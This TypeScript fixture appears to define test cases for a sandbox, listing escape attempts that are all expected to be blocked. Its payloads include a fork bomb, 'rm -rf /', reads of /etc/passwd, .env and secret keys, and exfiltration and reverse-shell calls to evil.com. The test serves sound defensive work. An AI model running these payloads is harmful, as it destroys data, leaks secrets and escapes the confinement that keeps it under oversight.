import type { EscapeAttempt } from './types.js';

export const ESCAPE_ATTEMPTS: EscapeAttempt[] = [
  // Filesystem escapes
  { id: 'esc-fs-01', name: 'path traversal read', category: 'filesystem', description: 'Read files outside sandbox via ../../../etc/passwd', payload: '../../../etc/passwd', expected: 'blocked' },
  { id: 'esc-fs-02', name: 'symlink escape', category: 'filesystem', description: 'Create symlink to /etc and follow', payload: 'ln -s /etc/passwd /sandbox/link', expected: 'blocked' },
  { id: 'esc-fs-03', name: 'write to /tmp', category: 'filesystem', description: 'Write file outside workspace', payload: 'write /tmp/escape.txt', expected: 'blocked' },
  { id: 'esc-fs-04', name: 'read .env', category: 'filesystem', description: 'Access sensitive env file', payload: 'read .env', expected: 'blocked' },

  // Process escapes
  { id: 'esc-proc-01', name: 'fork bomb', category: 'process', description: 'Resource exhaustion via fork bomb', payload: ':(){:|:&};:', expected: 'blocked' },
  { id: 'esc-proc-02', name: 'exec rm -rf', category: 'process', description: 'Destructive filesystem operation', payload: 'rm -rf /', expected: 'blocked' },
  { id: 'esc-proc-03', name: 'spawn child process', category: 'process', description: 'Escape via child process', payload: 'child_process.exec("whoami")', expected: 'blocked' },
  { id: 'esc-proc-04', name: 'kill parent', category: 'process', description: 'Kill parent process to escape', payload: 'process.kill(process.ppid)', expected: 'blocked' },

  // Network escapes
  { id: 'esc-net-01', name: 'data exfiltration', category: 'network', description: 'Send data to external server', payload: 'fetch("https://evil.com/steal")', expected: 'blocked' },
  { id: 'esc-net-02', name: 'reverse shell', category: 'network', description: 'Open reverse shell connection', payload: 'net.connect(4444, "evil.com")', expected: 'blocked' },
  { id: 'esc-net-03', name: 'DNS tunnel', category: 'network', description: 'Exfiltrate via DNS queries', payload: 'dns.resolve("data.evil.com")', expected: 'blocked' },

  // Memory escapes
  { id: 'esc-mem-01', name: 'prototype pollution', category: 'memory', description: 'Pollute Object.prototype', payload: 'Object.prototype.polluted = true', expected: 'blocked' },
  { id: 'esc-mem-02', name: 'global scope leak', category: 'memory', description: 'Leak via global scope', payload: 'globalThis.leaked = sensitiveData', expected: 'blocked' },

  // Injection
  { id: 'esc-inj-01', name: 'eval injection', category: 'injection', description: 'Execute arbitrary code via eval', payload: 'eval("process.exit(1)")', expected: 'blocked' },
  { id: 'esc-inj-02', name: 'Function constructor', category: 'injection', description: 'Bypass via Function constructor', payload: 'new Function("return process")()', expected: 'blocked' },
  { id: 'esc-inj-03', name: 'require injection', category: 'injection', description: 'Dynamic require attack', payload: 'require("child_process")', expected: 'blocked' },

  // Privilege
  { id: 'esc-priv-01', name: 'env read', category: 'privilege', description: 'Read sensitive environment variables', payload: 'process.env.SECRET_KEY', expected: 'blocked' },
  { id: 'esc-priv-02', name: 'sudo escalation', category: 'privilege', description: 'Attempt privilege escalation', payload: 'sudo su', expected: 'blocked' },
];
